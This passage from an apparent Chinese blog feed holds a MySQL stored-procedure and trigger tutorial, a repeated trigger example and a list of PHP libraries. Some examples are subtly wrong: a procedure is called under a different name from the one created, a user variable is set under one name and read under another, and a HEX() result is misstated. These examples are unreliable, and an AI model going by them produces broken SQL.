start="2"><li>关于MySQL的存储过程</li></ol><p>存储过程是数据库存储的一个重要的功能，但是MySQL在5.0以前并不支持存储过程，这使得MySQL在应用上大打折扣。好在MySQL 5.0终于开始已经支持存储过程，这样即可以大大提高数据库的处理速度，同时也可以提高数据库编程的灵活性。</p><ol start="3"><li>MySQL存储过程的创建</li></ol><p>(1). 格式</p><p>MySQL存储过程创建的格式：CREATE PROCEDURE 过程名 ([过程参数[,…]])<br>[特性 …] 过程体</p><p>这里先举个例子：</p><p>mysql&gt; DELIMITER //<br>mysql&gt; CREATE PROCEDURE proc1(OUT s int)<br>-&gt; BEGIN<br>-&gt; SELECT COUNT(*) INTO s FROM user;<br>-&gt; END<br>-&gt; //<br>mysql&gt; DELIMITER ;</p><p>注：</p><p>（1）这里需要注意的是DELIMITER //和DELIMITER ;两句，DELIMITER是分割符的意思，因为MySQL默认以”;”为分隔符，如果我们没有声明分割符，那么编译器会把存储过程当成SQL语句进行处理，则存储过程的编译过程会报错，所以要事先用DELIMITER关键字申明当前段分隔符，这样MySQL才会将”;”当做存储过程中的代码，不会执行这些代码，用完了之后要把分隔符还原。</p><p>（2）存储过程根据需要可能会有输入、输出、输入输出参数，这里有一个输出参数s，类型是int型，如果有多个参数用”,”分割开。</p><p>（3）过程体的开始与结束使用BEGIN与END进行标识。</p><p>这样，我们的一个MySQL存储过程就完成了，是不是很容易呢?看不懂也没关系，接下来，我们详细的讲解。</p><p>(2). 声明分割符</p><p>其实，关于声明分割符，上面的注解已经写得很清楚，不需要多说，只是稍微要注意一点的是：如果是用MySQL的Administrator管理工具时，可以直接创建，不再需要声明。</p><p>(3). 参数</p><p>MySQL存储过程的参数用在存储过程的定义，共有三种参数类型,IN,OUT,INOUT,形式如：</p><p>CREATE PROCEDURE([[IN |OUT |INOUT ] 参数名 数据类形…])</p><p>IN 输入参数:表示该参数的值必须在调用存储过程时指定，在存储过程中修改该参数的值不能被返回，为默认值</p><p>OUT 输出参数:该值可在存储过程内部被改变，并可返回</p><p>INOUT 输入输出参数:调用时指定，并且可被改变和返回</p><p>Ⅰ. IN参数例子</p><p>创建:</p><p>mysql &gt; DELIMITER //<br>mysql &gt; CREATE PROCEDURE demo_in_parameter(IN p_in int)<br>-&gt; BEGIN<br>-&gt; SELECT p_in;<br>-&gt; SET p_in=2;<br>-&gt; SELECT p_in;<br>-&gt; END;<br>-&gt; //<br>mysql &gt; DELIMITER ;</p><p>执行结果:</p><p>mysql &gt; SET @p_in=1;<br>mysql &gt; CALL demo_in_parameter(@p_in);<br>+——+<br>| p_in |<br>+——+<br>|   1  |<br>+——+</p><p>+——+<br>| p_in |<br>+——+<br>|   2  |<br>+——+</p><p>mysql&gt; SELECT @p_in;<br>+——-+<br>| @p_in |<br>+——-+<br>|  1    |<br>+——-+</p><p>以上可以看出，p_in虽然在存储过程中被修改，但并不影响@p_id的值</p><p>Ⅱ.OUT参数例子</p><p>创建:</p><p>mysql &gt; DELIMITER //<br>mysql &gt; CREATE PROCEDURE demo_out_parameter(OUT p_out int)<br>-&gt; BEGIN<br>-&gt; SELECT p_out;<br>-&gt; SET p_out=2;<br>-&gt; SELECT p_out;<br>-&gt; END;<br>-&gt; //<br>mysql &gt; DELIMITER ;</p><p>执行结果:</p><p>mysql &gt; SET @p_out=1;<br>mysql &gt; CALL sp_demo_out_parameter(@p_out);<br>+——-+<br>| p_out |<br>+——-+<br>| NULL  |<br>+——-+</p><p>+——-+<br>| p_out |<br>+——-+<br>|   2   |<br>+——-+</p><p>mysql&gt; SELECT @p_out;<br>+——-+<br>| p_out |<br>+——-+<br>|   2   |<br>+——-+</p><p>Ⅲ. INOUT参数例子</p><p>创建:</p><p>mysql &gt; DELIMITER //<br>mysql &gt; CREATE PROCEDURE demo_inout_parameter(INOUT p_inout int)<br>-&gt; BEGIN<br>-&gt; SELECT p_inout;<br>-&gt; SET p_inout=2;<br>-&gt; SELECT p_inout;<br>-&gt; END;<br>-&gt; //<br>mysql &gt; DELIMITER ;</p><p>执行结果:</p><p>mysql &gt; SET @p_inout=1;<br>mysql &gt; CALL demo_inout_parameter(@p_inout) ;<br>+———+<br>| p_inout |<br>+———+<br>|    1    |<br>+———+</p><p>+———+<br>| p_inout |<br>+———+<br>|    2    |<br>+———+</p><p>mysql &gt; SELECT @p_inout;<br>+———-+<br>| @p_inout |<br>+———-+<br>|    2     |<br>+———-+</p><p>(4). 变量</p><p>Ⅰ. 变量定义</p><p>DECLARE variable_name [,variable_name…] datatype [DEFAULT value];</p><p>其中，datatype为MySQL的数据类型，如:int, float, date, varchar(length)</p><p>例如:</p><p>DECLARE l_int int unsigned default 4000000;<br>DECLARE l_numeric number(8,2) DEFAULT 9.95;<br>DECLARE l_date date DEFAULT ‘1999-12-31’;<br>DECLARE l_datetime datetime DEFAULT ‘1999-12-31 23:59:59’;<br>DECLARE l_varchar varchar(255) DEFAULT ‘This will not be padded’;</p><p>Ⅱ. 变量赋值</p><p>SET 变量名 = 表达式值 [,variable_name = expression …]</p><p>Ⅲ. 用户变量</p><p>ⅰ. 在MySQL客户端使用用户变量</p><p>mysql &gt; SELECT ‘Hello World’ into @x;<br>mysql &gt; SELECT @x;<br>+————-+<br>|   @x        |<br>+————-+<br>| Hello World |<br>+————-+<br>mysql &gt; SET @y=’Goodbye Cruel World’;<br>mysql &gt; SELECT @y;<br>+———————+<br>|     @y              |<br>+———————+<br>| Goodbye Cruel World |<br>+———————+</p><p>mysql &gt; SET @z=1+2+3;<br>mysql &gt; SELECT @z;<br>+——+<br>| @z   |<br>+——+<br>|  6   |<br>+——+</p><p>ⅱ. 在存储过程中使用用户变量</p><p>mysql &gt; CREATE PROCEDURE GreetWorld( ) SELECT CONCAT(@greeting,’ World’);<br>mysql &gt; SET @greeting=’Hello’;<br>mysql &gt; CALL GreetWorld( );<br>+—————————-+<br>| CONCAT(@greeting,’ World’) |<br>+—————————-+<br>|  Hello World               |<br>+—————————-+</p><p>ⅲ. 在存储过程间传递全局范围的用户变量</p><p>mysql&gt; CREATE PROCEDURE p1()   SET @last_procedure=’p1’;<br>mysql&gt; CREATE PROCEDURE p2() SELECT CONCAT(‘Last procedure was ‘,@last_proc);<br>mysql&gt; CALL p1( );<br>mysql&gt; CALL p2( );<br>+———————————————–+<br>| CONCAT(‘Last procedure was ‘,@last_proc  |<br>+———————————————–+<br>| Last procedure was p1                         |<br>+———————————————–+</p><p>注意:</p><p>①用户变量名一般以@开头</p><p>②滥用用户变量会导致程序难以理解及管理</p><p>(5). 注释</p><p>MySQL存储过程可使用两种风格的注释</p><p>双模杠：–</p><p>该风格一般用于单行注释</p><p>c风格： 一般用于多行注释</p><p>例如：</p><p>mysql &gt; DELIMITER //<br>mysql &gt; CREATE PROCEDURE proc1 –name存储过程名<br>-&gt; (IN parameter1 INTEGER)<br>-&gt; BEGIN<br>-&gt; DECLARE variable1 CHAR(10);<br>-&gt; IF parameter1 = 17 THEN<br>-&gt; SET variable1 = ‘birds’;<br>-&gt; ELSE<br>-&gt; SET variable1 = ‘beasts’;<br>-&gt; END IF;<br>-&gt; INSERT INTO table1 VALUES (variable1);<br>-&gt; END<br>-&gt; //<br>mysql &gt; DELIMITER ;</p><ol start="4"><li>MySQL存储过程的调用</li></ol><p>用call和你过程名以及一个括号，括号里面根据需要，加入参数，参数包括输入参数、输出参数、输入输出参数。具体的调用方法可以参看上面的例子。</p><ol start="5"><li>MySQL存储过程的查询</li></ol><p>我们像知道一个数据库下面有那些表，我们一般采用show tables;进行查看。那么我们要查看某个数据库下面的存储过程，是否也可以采用呢？答案是，我们可以查看某个数据库下面的存储过程，但是是令一钟方式。</p><p>我们可以用</p><p>select name from mysql.proc where db=’数据库名’;</p><p>或者</p><p>select routine_name from information_schema.routines where routine_schema=’数据库名’;</p><p>或者</p><p>show procedure status where db=’数据库名’;</p><p>进行查询。</p><p>如果我们想知道，某个存储过程的详细，那我们又该怎么做呢？是不是也可以像操作表一样用describe 表名进行查看呢？</p><p>答案是：我们可以查看存储过程的详细，但是需要用另一种方法：</p><p>SHOW CREATE PROCEDURE 数据库.存储过程名;</p><p>就可以查看当前存储过程的详细。</p><ol start="6"><li>MySQL存储过程的修改</li></ol><p>ALTER PROCEDURE</p><p>更改用CREATE PROCEDURE 建立的预先指定的存储过程，其不会影响相关存储过程或存储功能。</p><ol start="7"><li>MySQL存储过程的删除</li></ol><p>删除一个存储过程比较简单，和删除表一样：</p><p>DROP PROCEDURE</p><p>从MySQL的表格中删除一个或多个存储过程。</p><ol start="8"><li>MySQL存储过程的控制语句</li></ol><p>(1). 变量作用域</p><p>内部的变量在其作用域范围内享有更高的优先权，当执行到end。变量时，内部变量消失，此时已经在其作用域外，变量不再可见了，应为在存储<br>过程外再也不能找到这个申明的变量，但是你可以通过out参数或者将其值指派<br>给会话变量来保存其值。</p><p>mysql &gt; DELIMITER //<br>mysql &gt; CREATE PROCEDURE proc3()<br>-&gt; begin<br>-&gt; declare x1 varchar(5) default ‘outer’;<br>-&gt; begin<br>-&gt; declare x1 varchar(5) default ‘inner’;<br>-&gt; select x1;<br>-&gt; end;<br>-&gt; select x1;<br>-&gt; end;<br>-&gt; //<br>mysql &gt; DELIMITER ;</p><p>(2). 条件语句</p><p>Ⅰ. if-then -else语句</p><p>mysql &gt; DELIMITER //<br>mysql &gt; CREATE PROCEDURE proc2(IN parameter int)<br>-&gt; begin<br>-&gt; declare var int;<br>-&gt; set var=parameter+1;<br>-&gt; if var=0 then<br>-&gt; insert into t values(17);<br>-&gt; end if;<br>-&gt; if parameter=0 then<br>-&gt; update t set s1=s1+1;<br>-&gt; else<br>-&gt; update t set s1=s1+2;<br>-&gt; end if;<br>-&gt; end;<br>-&gt; //<br>mysql &gt; DELIMITER ;</p><p>Ⅱ. case语句：</p><p>mysql &gt; DELIMITER //<br>mysql &gt; CREATE PROCEDURE proc3 (in parameter int)<br>-&gt; begin<br>-&gt; declare var int;<br>-&gt; set var=parameter+1;<br>-&gt; case var<br>-&gt; when 0 then<br>-&gt; insert into t values(17);<br>-&gt; when 1 then<br>-&gt; insert into t values(18);<br>-&gt; else<br>-&gt; insert into t values(19);<br>-&gt; end case;<br>-&gt; end;<br>-&gt; //<br>mysql &gt; DELIMITER ;</p><p>(3). 循环语句</p><p>Ⅰ. while ···· end while：</p><p>mysql &gt; DELIMITER //<br>mysql &gt; CREATE PROCEDURE proc4()<br>-&gt; begin<br>-&gt; declare var int;<br>-&gt; set var=0;<br>-&gt; while var&lt;6 do<br>-&gt; insert into t values(var);<br>-&gt; set var=var+1;<br>-&gt; end while;<br>-&gt; end;<br>-&gt; //<br>mysql &gt; DELIMITER ;</p><p>Ⅱ. repeat···· end repeat：</p><p>它在执行操作后检查结果，而while则是执行前进行检查。</p><p>mysql &gt; DELIMITER //<br>mysql &gt; CREATE PROCEDURE proc5 ()<br>-&gt; begin<br>-&gt; declare v int;<br>-&gt; set v=0;<br>-&gt; repeat<br>-&gt; insert into t values(v);<br>-&gt; set v=v+1;<br>-&gt; until v&gt;=5<br>-&gt; end repeat;<br>-&gt; end;<br>-&gt; //<br>mysql &gt; DELIMITER ;</p><p>Ⅲ. loop ·····end loop:</p><p>loop循环不需要初始条件，这点和while 循环相似，同时和repeat循环一样不需要结束条件, leave语句的意义是离开循环。</p><p>mysql &gt; DELIMITER //<br>mysql &gt; CREATE PROCEDURE proc6 ()<br>-&gt; begin<br>-&gt; declare v int;<br>-&gt; set v=0;<br>-&gt; LOOP_LABLE:loop<br>-&gt; insert into t values(v);<br>-&gt; set v=v+1;<br>-&gt; if v &gt;=5 then<br>-&gt; leave LOOP_LABLE;<br>-&gt; end if;<br>-&gt; end loop;<br>-&gt; end;<br>-&gt; //<br>mysql &gt; DELIMITER ;</p><p>Ⅳ. LABLES 标号：</p><p>标号可以用在begin repeat while 或者loop 语句前，语句标号只能在合法的语句前面使用。可以跳出循环，使运行指令达到复合语句的最后一步。</p><p>(4). ITERATE迭代</p><p>Ⅰ. ITERATE:</p><p>通过引用复合语句的标号,来从新开始复合语句</p><p>mysql &gt; DELIMITER //<br>mysql &gt; CREATE PROCEDURE proc10 ()<br>-&gt; begin<br>-&gt; declare v int;<br>-&gt; set v=0;<br>-&gt; LOOP_LABLE:loop<br>-&gt; if v=3 then<br>-&gt; set v=v+1;<br>-&gt; ITERATE LOOP_LABLE;<br>-&gt; end if;<br>-&gt; insert into t values(v);<br>-&gt; set v=v+1;<br>-&gt; if v&gt;=5 then<br>-&gt; leave LOOP_LABLE;<br>-&gt; end if;<br>-&gt; end loop;<br>-&gt; end;<br>-&gt; //<br>mysql &gt; DELIMITER ;</p><ol start="9"><li>MySQL存储过程的基本函数</li></ol><p>(1).字符串类</p><p>CHARSET(str) //返回字串字符集<br>CONCAT (string2 [,… ]) //连接字串<br>INSTR (string ,substring ) //返回substring首次在string中出现的位置,不存在返回0<br>LCASE (string2 ) //转换成小写<br>LEFT (string2 ,length ) //从string2中的左边起取length个字符<br>LENGTH (string ) //string长度<br>LOAD_FILE (file_name ) //从文件读取内容<br>LOCATE (substring , string [,start_position ] ) 同INSTR,但可指定开始位置<br>LPAD (string2 ,length ,pad ) //重复用pad加在string开头,直到字串长度为length<br>LTRIM (string2 ) //去除前端空格<br>REPEAT (string2 ,count ) //重复count次<br>REPLACE (str ,search_str ,replace_str ) //在str中用replace_str替换search_str<br>RPAD (string2 ,length ,pad) //在str后用pad补充,直到长度为length<br>RTRIM (string2 ) //去除后端空格<br>STRCMP (string1 ,string2 ) //逐字符比较两字串大小,<br>SUBSTRING (str , position [,length ]) //从str的position开始,取length个字符,<br>注：mysql中处理字符串时，默认第一个字符下标为1，即参数position必须大于等于1</p><p>mysql&gt; select substring(‘abcd’,0,2);<br>+———————–+<br>| substring(‘abcd’,0,2) |<br>+———————–+<br>|                       |<br>+———————–+<br>1 row in set (0.00 sec)</p><p>mysql&gt; select substring(‘abcd’,1,2);<br>+———————–+<br>| substring(‘abcd’,1,2) |<br>+———————–+<br>|     ab                |<br>+———————–+<br>1 row in set (0.02 sec)</p><p>TRIM([[BOTH|LEADING|TRAILING] [padding] FROM]string2) //去除指定位置的指定字符<br>UCASE (string2 ) //转换成大写<br>RIGHT(string2,length) //取string2最后length个字符<br>SPACE(count) //生成count个空格</p><p>(2).数学类</p><p>ABS (number2 ) //绝对值<br>BIN (decimal_number ) //十进制转二进制<br>CEILING (number2 ) //向上取整<br>CONV(number2,from_base,to_base) //进制转换<br>FLOOR (number2 ) //向下取整<br>FORMAT (number,decimal_places ) //保留小数位数<br>HEX (DecimalNumber ) //转十六进制<br>注：HEX()中可传入字符串，则返回其ASC-11码，如HEX(‘DEF’)返回4142143<br>也可以传入十进制整数，返回其十六进制编码，如HEX(25)返回19<br>LEAST (number , number2 [,..]) //求最小值<br>MOD (numerator ,denominator ) //求余<br>POWER (number ,power ) //求指数<br>RAND([seed]) //随机数<br>ROUND (number [,decimals ]) //四舍五入,decimals为小数位数]</p><p>注：返回类型并非均为整数，如：<br>(1)默认变为整形值</p><p>mysql&gt; select round(1.23);<br>+————-+<br>| round(1.23) |<br>+————-+<br>|           1 |<br>+————-+<br>1 row in set (0.00 sec)</p><p>mysql&gt; select round(1.56);<br>+————-+<br>| round(1.56) |<br>+————-+<br>|           2 |<br>+————-+<br>1 row in set (0.00 sec)</p><p>(2)可以设定小数位数，返回浮点型数据</p><p>mysql&gt; select round(1.567,2);<br>+—————-+<br>| round(1.567,2) |<br>+—————-+<br>|           1.57 |<br>+—————-+<br>1 row in set (0.00 sec)</p><p>SIGN (number2 ) //</p><p>(3).日期时间类<br>ADDTIME (date2 ,time_interval ) //将time_interval加到date2<br>CONVERT_TZ (datetime2 ,fromTZ ,toTZ ) //转换时区<br>CURRENT_DATE ( ) //当前日期<br>CURRENT_TIME ( ) //当前时间<br>CURRENT_TIMESTAMP ( ) //当前时间戳<br>DATE (datetime ) //返回datetime的日期部分<br>DATE_ADD (date2 , INTERVAL d_value d_type ) //在date2中加上日期或时间<br>DATE_FORMAT (datetime ,FormatCodes ) //使用formatcodes格式显示datetime<br>DATE_SUB (date2 , INTERVAL d_value d_type ) //在date2上减去一个时间<br>DATEDIFF (date1 ,date2 ) //两个日期差<br>DAY (date ) //返回日期的天<br>DAYNAME (date ) //英文星期<br>DAYOFWEEK (date ) //星期(1-7) ,1为星期天<br>DAYOFYEAR (date ) //一年中的第几天<br>EXTRACT (interval_name FROM date ) //从date中提取日期的指定部分<br>MAKEDATE (year ,day ) //给出年及年中的第几天,生成日期串<br>MAKETIME (hour ,minute ,second ) //生成时间串<br>MONTHNAME (date ) //英文月份名<br>NOW ( ) //当前时间<br>SEC_TO_TIME (seconds ) //秒数转成时间<br>STR_TO_DATE (string ,format ) //字串转成时间,以format格式显示<br>TIMEDIFF (datetime1 ,datetime2 ) //两个时间差<br>TIME_TO_SEC (time ) //时间转秒数]<br>WEEK (date_time [,start_of_week ]) //第几周<br>YEAR (datetime ) //年份<br>DAYOFMONTH(datetime) //月的第几天<br>HOUR(datetime) //小时<br>LAST_DAY(date) //date的月的最后日期<br>MICROSECOND(datetime) //微秒<br>MONTH(datetime) //月<br>MINUTE(datetime) //分返回符号,正负或0<br>SQRT(number2) //开平方</p><p>&nbsp;</p><p>From:<a href="http://xdj651897373-126-com.iteye.com/blog/1819924" target="_blank">http://xdj651897373-126-com.iteye.com/blog/1819924</a></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql触发器以及存储过程</title>
      <link href="/2013/07/31/mysql/%E8%A7%A6%E5%8F%91%E5%99%A8%E4%BB%A5%E5%8F%8A%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/"/>
      <url>/2013/07/31/mysql/%E8%A7%A6%E5%8F%91%E5%99%A8%E4%BB%A5%E5%8F%8A%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>触发器<br>catabig为表名<br>所操作的数据： 添加的数据或修改后的数据为new  删除或修改前的数据为old<br>触发器需要避免死循环<br>如 insert操作触发触发器的insert操作 依次无限循环下去导致死循环</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; delimiter //</span><br><span class="line">mysql&gt; create trigger mytrigger before update</span><br><span class="line"><span class="code">    -&gt;  on catabig for each row</span></span><br><span class="line"><span class="code">    -&gt; begin</span></span><br><span class="line"><span class="code">    -&gt;  set new.t=concat(new.t,old.t);</span></span><br><span class="line"><span class="code">    -&gt; end//</span></span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; delimiter ;</span><br><span class="line">mysql&gt; select * from catabig;</span><br><span class="line"><span class="code">+----+</span>------+</span><br><span class="line">| id | t    |</span><br><span class="line"><span class="code">+----+</span>------+</span><br><span class="line">|  3 | PHP  |</span><br><span class="line"><span class="code">+----+</span>------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; update catabig set t=<span class="emphasis">'_upd'</span> where id=3;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from catabig;</span><br><span class="line"><span class="code">+----+</span>---------+</span><br><span class="line">| id | t       |</span><br><span class="line"><span class="code">+----+</span>---------+</span><br><span class="line">|  3 | <span class="emphasis">_updPHP |</span></span><br><span class="line"><span class="emphasis">+----+---------+</span></span><br><span class="line"><span class="emphasis">3 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure><p>存储过程</p><figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">delimiter <span class="comment">//</span></span><br><span class="line"><span class="keyword">create</span> <span class="function"><span class="keyword">procedure</span> <span class="title">mypro</span><span class="params">(ed int)</span></span></span><br><span class="line"><span class="function"><span class="title">begin</span></span></span><br><span class="line"><span class="function"><span class="title">declare</span> <span class="title">i</span> <span class="title">int</span>;</span>  -- 定义声明必须在最前面</span><br><span class="line">declare rs  int;</span><br><span class="line"><span class="keyword">set</span> rs=<span class="number">0</span> ;</span><br><span class="line"><span class="keyword">set</span> i=<span class="number">1</span> ;</span><br><span class="line">label1:<span class="keyword">loop</span></span><br><span class="line"><span class="keyword">if</span> i&lt;=ed<span class="keyword">then</span> </span><br><span class="line"><span class="keyword">set</span> rs=i+rs;</span><br><span class="line"><span class="keyword">set</span> i=i+<span class="number">1</span>;</span><br><span class="line">ITERATE label1;  -- 继续循环</span><br><span class="line"><span class="keyword">else</span> leave label1;   -- 结束循环</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">loop</span> label1;             -- 结束循环</span><br><span class="line"><span class="keyword">select</span> rs;      -- 不允许存在return（只有<span class="function"><span class="keyword">function</span>可以有<span class="title">return</span>）</span></span><br><span class="line"><span class="function"><span class="title">end</span>  //</span></span><br><span class="line"><span class="function"><span class="title">delimiter</span> ;</span></span><br><span class="line"> -- 调用</span><br><span class="line">mysql&gt; call mypro(<span class="number">100</span>);</span><br><span class="line">+------+</span><br><span class="line">| rs   |</span><br><span class="line">+------+</span><br><span class="line">| <span class="number">5050</span> |</span><br><span class="line">+------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">0</span> rows affected (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql trigger </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql_trigger_and_procedure</title>
      <link href="/2013/07/31/mysql/mysql_trigger_and_procedure/"/>
      <url>/2013/07/31/mysql/mysql_trigger_and_procedure/</url>
      
        <content type="html"><![CDATA[<h5 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h5><p>catabig为表名<br>所操作的数据： 添加的数据或修改后的数据为new  删除或修改前的数据为old<br>触发器需要避免死循环<br>如 insert操作触发触发器的insert操作 依次无限循环下去导致死循环</p><p>···<br>mysql&gt; delimiter //<br>mysql&gt; create trigger mytrigger before update<br>    -&gt;  on catabig for each row<br>    -&gt; begin<br>    -&gt;  set new.t=concat(new.t,old.t);<br>    -&gt; end//<br>Query OK, 0 rows affected (0.04 sec)</p><p>mysql&gt; delimiter ;<br>mysql&gt; select * from catabig;<br>+—-+——+<br>| id | t    |<br>+—-+——+<br>|  3 | PHP  |<br>+—-+——+<br>3 rows in set (0.00 sec)<br>mysql&gt; update catabig set t=’_upd’ where id=3;<br>Query OK, 1 row affected (0.00 sec)<br>Rows matched: 1  Changed: 1  Warnings: 0<br>mysql&gt; select * from catabig;<br>+—-+———+<br>| id | t       |<br>+—-+———+<br>|  3 | _updPHP |<br>+—-+———+<br>3 rows in set (0.00 sec)<br>···</p><h5 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h5><p>···<br>delimiter //<br>create procedure mypro(ed int)<br>begin<br>    declare i int;  – 定义声明必须在最前面<br>    declare rs  int;<br>    set rs=0 ;<br>    set i=1 ;<br>    label1:loop<br>        if i&lt;=ed    then<br>            set rs=i+rs;<br>            set i=i+1;<br>            ITERATE label1;  – 继续循环<br>        else leave label1;   – 结束循环<br>        end if;<br>    end loop label1;             – 结束循环<br>    select rs;      – 不允许存在return（只有function可以有return）<br>end  //<br>delimiter ;<br> – 调用<br>mysql&gt; call mypro(100);<br>+——+<br>| rs   |<br>+——+<br>| 5050 |<br>+——+<br>1 row in set (0.00 sec)</p><p>Query OK, 0 rows affected (0.00 sec)<br>···</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>useful php packages</title>
      <link href="/2013/07/25/php/%E5%B8%B8%E7%94%A8%E7%9A%84PHP%E7%B1%BB%E5%BA%93/"/>
      <url>/2013/07/25/php/%E5%B8%B8%E7%94%A8%E7%9A%84PHP%E7%B1%BB%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h5 id="PDF-生成器"><a href="#PDF-生成器" class="headerlink" title="PDF 生成器"></a>PDF 生成器</h5><p><a href="http://www.fpdf.org" target="_blank" rel="noopener">FPDF</a> 这量一个可以让你生成PDF的纯PHP类库。</p><h5 id="Excel-相关"><a href="#Excel-相关" class="headerlink" title="Excel 相关"></a>Excel 相关</h5><p><a href="http://code.google.com/p/php-excel" target="_blank" rel="noopener">php-excel</a> 这是一个非常简单的Excel文件生成类。</p><p><a href="http://code.google.com/p/php-excel-reader" target="_blank" rel="noopener">PHP Excel Reader</a>可以解析并读取XLS文件中的数据。</p><h5 id="E-Mail相关"><a href="#E-Mail相关" class="headerlink" title="E-Mail相关"></a>E-Mail相关</h5><p><a href="http://swiftmailer.org" target="_blank" rel="noopener">Swift Mailer</a>  免费的超多功能的PHP邮件库。</p><p><a href="http://phpmailer.codeworxtech.com" target="_blank" rel="noopener">PHPMailer</a> 超强大的邮件发送类。</p><p><a href="http://www.phpddt.com/php/863.html" target="_blank" rel="noopener">PHPMailer使用教程</a> PHPMailer使用教程，使用PHPMailer发送邮件（含附件下载）</p><h5 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h5><p><a href="http://www.simpletest.org" target="_blank" rel="noopener">SimpleTest</a> 一个PHP的单元测试和网页测试的框架。</p><p><a href="http://www.phpunit.de" target="_blank" rel="noopener">PHPUnit</a> 提供一个框架可以让你方便地进行单元测试的案例开发。并可非常容易地分析其测试结果。</p><h5 id="图表库"><a href="#图表库" class="headerlink" title="图表库"></a>图表库</h5><p><a href="http://pchart.sourceforge.net" target="_blank" rel="noopener">pChart</a> 一个可以创建统计图的库。</p><p><a href="http://naku.dohcrew.com/libchart/pages/introduction" target="_blank" rel="noopener">Libchart</a> 这也是一个简单的统计图库。</p><p><a href="http://www.aditus.nu/jpgraph" target="_blank" rel="noopener">JpGraph</a> 一个面向对象的图片创建类</p><h5 id="RSS-解析"><a href="#RSS-解析" class="headerlink" title="RSS 解析"></a>RSS 解析</h5><p><a href="http://magpierss.sourceforge.net" target="_blank" rel="noopener">MagpieRSS</a> 开源的PHP版RSS解析器，据说功能强大，未验证。</p><p><a href="http://simplepie.org" target="_blank" rel="noopener">SimplePie</a> 这是一个非常快速，而且易用的RSS和Atom 解析库。</p><h5 id="缩略图生成"><a href="#缩略图生成" class="headerlink" title="缩略图生成"></a>缩略图生成</h5><p><a href="http://phpthumb.sourceforge.net" target="_blank" rel="noopener">phpThumb</a> 功能很强大</p><h5 id="支付"><a href="#支付" class="headerlink" title="支付"></a>支付</h5><p><a href="http://www.phpfour.com/blog/2009/02/php-payment-gateway-library-for-paypal-authorizenet-and-2checkout" target="_blank" rel="noopener">PHP Payment Library</a> 支持Paypal, Authorize.net 和2Checkout (2CO)</p><h5 id="OpenID"><a href="#OpenID" class="headerlink" title="OpenID"></a>OpenID</h5><p><a href="http://www.openidenabled.com/php-openid" target="_blank" rel="noopener">PHP-OpenID</a> 支持OpenID的一个PHP库。OpenID是帮助你使用相同的用户名和口令登录不同的网站的一种解决方案。如果你对OpenID不熟悉的话，你可以到这里看看：<a href="http://openid.net.cn/" target="_blank" rel="noopener">http://openid.net.cn/</a></p><h5 id="对象关系映射ORM"><a href="#对象关系映射ORM" class="headerlink" title="对象关系映射ORM"></a>对象关系映射ORM</h5><p><a href="http://adodb.sourceforge.net" target="_blank" rel="noopener">ADOdb</a> 数据库抽象<br><a href="http://www.phpddt.com/tag/ADODBadodb" target="_blank" rel="noopener">http://www.phpddt.com/tag/ADODBadodb</a>  专题教程</p><p><a href="http://www.doctrine-project.org" target="_blank" rel="noopener">Doctrine</a> 对象关系映射Object relational mapper (ORM) ，需要 PHP 5.2.3+ 版本，一个非常强大的database abstraction layer (DBAL).</p><p><a href="http://propel.phpdb.org/trac" target="_blank" rel="noopener">Propel</a> 对象关系映射框架</p><p><a href="http://www.outlet-orm.org/site" target="_blank" rel="noopener">Outlet</a> 也是关于对象关系映射的一个工具</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phppdf </tag>
            
            <tag> phpexcel </tag>
            
            <tag> phpemail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于PHP定时执行任务的实现</title>
      <link href="/2013/07/25/php/%E5%85%B3%E4%BA%8EPHP%E5%AE%9A%E6%97%B6%E6%89%A7%E8%A1%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
      <url>/2013/07/25/php/%E5%85%B3%E4%BA%8EPHP%E5%AE%9A%E6%97%B6%E6%89%A7%E8%A1%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
      
